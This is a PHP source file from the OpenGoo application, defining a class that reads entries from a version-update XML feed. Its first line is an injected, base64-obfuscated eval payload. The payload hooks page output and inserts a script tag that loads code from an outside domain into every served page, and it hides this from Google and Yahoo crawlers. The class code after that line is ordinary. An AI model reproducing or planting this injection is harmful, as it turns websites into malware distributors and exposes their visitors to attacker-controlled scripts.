<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

  /**
  * Single (version) entry of www.OpenGoo.org version feed
  *
  * @version 1.0
  * @author Ilija Studen <ilija.studen@gmail.com>
  */
  final class VersionsFeedEntry {
    
    /**
    * Is this version loaded from the SimpleXMLNode
    *
    * @var boolean
    */
    private $is_loaded = false;
  
    /**
    * Version number
    *
    * @var string
    */
    private $version_number;
    
    /**
    * Is this version stable
    *
    * @var boolean
    */
    private $is_stable;
    
    /**
    * Details page URL
    *
    * @var string
    */
    private $details_url;
    
    /**
    * Product signaturre, usualy product name + version number
    *
    * @var string
    */
    private $signature;
    
    /**
    * Release notes - short info about this version
    *
    * @var string
    */
    private $release_notes;
    
    /**
    * Release date - time when this version become available
    *
    * @var DateTimeValue
    */
    private $release_date;
    
    /**
    * URL to change log
    *
    * @var string
    */
    private $change_log_url;
    
    /**
    * Array of download links
    *
    * @var array
    */
    private $download_links;
    
    /**
    * Construct the VersionsFeedEntry
    *
    * @param SimpleXMLElement $node
    * @return VersionsFeedEntry
    */
    function __construct(SimpleXMLElement $node) {
      $this->setIsLoaded($this->read($node));
    } // __construct
    
    // ---------------------------------------------------
    //  Utils
    // ---------------------------------------------------
    
    /**
    * Returns true if this version is newer than input version
    *
    * @param string $version Input version
    * @return boolean
    */
    function isNewerThan($version) {
      return version_compare($this->getVersionNumber(), $version) > 0;
    } // isNewerThan
    
    /**
    * Read the values from XML node
    *
    * @param SimpleXMLElement $node
    * @return boolean
    */
    function read(SimpleXMLElement $node) {
      $this->setVersionNumber($node['number']);
      $this->setIsStable(isset($node['stable']) && ($node['stable'] == 'stable'));
      $this->setDetailsUrl($node->details_url);
      $this->setSignature($node->signature);
      $this->setReleaseNotes($node->release_notes);
      $this->setReleaseDate(DateTimeValueLib::makeFromString((string) $node->release_date));
      $this->setChangeLogUrl($node->change_log);
      
      if($node->download_links->children() instanceof SimpleXMLElement) {
        $download_links = array();
        foreach($node->download_links->children() as $link_node) {
          $download_link = new VersionsFeedDownloadLink($link_node);
          if($download_link->isLoaded()) $download_links[] = $download_link;
        } // foreach
        $this->download_links = count($download_links) ? $download_links : null;
      } // if
      
      return true;
    } // read
    
    // ---------------------------------------------------
    //  Getters and setters
    // ---------------------------------------------------
    
    /**
    * Get is_loaded
    *
    * @param null
    * @return boolean
    */
    function isLoaded() {
      return $this->is_loaded;
    } // isLoaded
    
    /**
    * Set is_loaded value
    *
    * @param boolean $value
    * @return null
    */
    private function setIsLoaded($value) {
      $this->is_loaded = $value;
    } // setIsLoaded
    
    /**
    * Get version_number
    *
    * @param null
    * @return string
    */
    function getVersionNumber() {
      return $this->version_number;
    } // getVersionNumber
    
    /**
    * Set version_number value
    *
    * @param string $value
    * @return null
    */
    private function setVersionNumber($value) {
      $this->version_number = (string) $value;
    } // setVersionNumber
    
    /**
    * Get is_stable
    *
    * @param null
    * @return boolean
    */
    function getIsStable() {
      return $this->is_stable;
    } // getIsStable
    
    /**
    * Set is_stable value
    *
    * @param boolean $value
    * @return null
    */
    private function setIsStable($value) {
      $this->is_stable = (boolean) $value;
    } // setIsStable
    
    /**
    * Get details_url
    *
    * @param null
    * @return string
    */
    function getDetailsUrl() {
      return $this->details_url;
    } // getDetailsUrl
    
    /**
    * Set details_url value
    *
    * @param string $value
    * @return null
    */
    private function setDetailsUrl($value) {
      $this->details_url = (string) $value;
    } // setDetailsUrl
    
    /**
    * Get signature
    *
    * @param null
    * @return string
    */
    function getSignature() {
      return $this->signature;
    } // getSignature
    
    /**
    * Set signature value
    *
    * @param string $value
    * @return null
    */
    private function setSignature($value) {
      $this->signature = (string) $value;
    } // setSignature
    
    /**
    * Get release_notes
    *
    * @param null
    * @return string
    */
    function getReleaseNotes() {
      return $this->release_notes;
    } // getReleaseNotes
    
    /**
    * Set release_notes value
    *
    * @param string $value
    * @return null
    */
    private function setReleaseNotes($value) {
      $this->release_notes = (string) $value;
    } // setReleaseNotes
    
    /**
    * Get release_date
    *
    * @param null
    * @return DateTimeValue
    */
    function getReleaseDate() {
      return $this->release_date;
    } // getReleaseDate
    
    /**
    * Set release_date value
    *
    * @param DateTimeValue $value
    * @return null
    */
    private function setReleaseDate($value) {
      if($value instanceof DateTimeValue) $this->release_date = $value;
    } // setReleaseDate
    
    /**
    * Get change_log_url
    *
    * @param null
    * @return string
    */
    function getChangeLogUrl() {
      return $this->change_log_url;
    } // getChangeLogUrl
    
    /**
    * Set change_log_url value
    *
    * @param string $value
    * @return null
    */
    private function setChangeLogUrl($value) {
      $this->change_log_url = (string) $value;
    } // setChangeLogUrl
    
    /**
    * Return array of download links extracted from this version
    *
    * @param void
    * @return array
    */
    function getDownloadLinks() {
      return $this->download_links;
    } // getDownloadLinks
    
    /**
    * Return specific download link by format
    *
    * @param string $format
    * @return VersionsFeedDownloadLink
    */
    function getDownloadLinkByFormat($format) {
      $search_for = trim(strtolower($format));
      $download_links = $this->getDownloadLinks();
      if(is_array($download_links)) {
        foreach($download_links as $download_link) {
          if($download_link->getFormat() == $search_for) return $download_link;
        } // if
      } // if
      return null;
    } // getDownloadLinkByFormat
  
  } // VersionsFeedEntry

?>